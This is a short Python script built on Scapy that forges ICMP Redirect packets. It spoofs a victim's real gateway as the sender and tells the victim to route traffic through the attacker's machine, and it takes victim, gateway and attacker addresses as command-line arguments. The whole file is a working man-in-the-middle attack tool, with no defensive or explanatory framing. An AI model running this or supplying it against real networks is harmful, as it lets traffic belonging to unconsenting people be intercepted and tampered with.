#!/usr/bin/python3

from scapy.all import *
import argparse

def send_icmp_redirect(victim_ip, victim_mac, real_gw_ip, attacker_ip, interface):
    ether = Ether(dst=victim_mac)
    ip = IP(src=real_gw_ip, dst=victim_ip)
    icmp = ICMP(type=5, code=1, gw=attacker_ip)
    # Dummy IP header inside ICMP payload (what was being redirected)
    fake_payload = IP(src=victim_ip, dst="8.8.8.8")/ICMP()
    packet = ether/ip/icmp/fake_payload

    sendp(packet, iface=interface, verbose=False)
    print(f"[+] Sent ICMP Redirect to {victim_ip}: use {attacker_ip} instead of {real_gw_ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-m", "--mac", required=True, help="Victim MAC address")
    parser.add_argument("-g", "--gateway", required=True, help="Real Gateway IP")
    parser.add_argument("-a", "--attacker", required=True, help="Attacker (this machine) IP")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0)")

    args = parser.parse_args()

    send_icmp_redirect(args.victim, args.mac, args.gateway, args.attacker, args.interface)
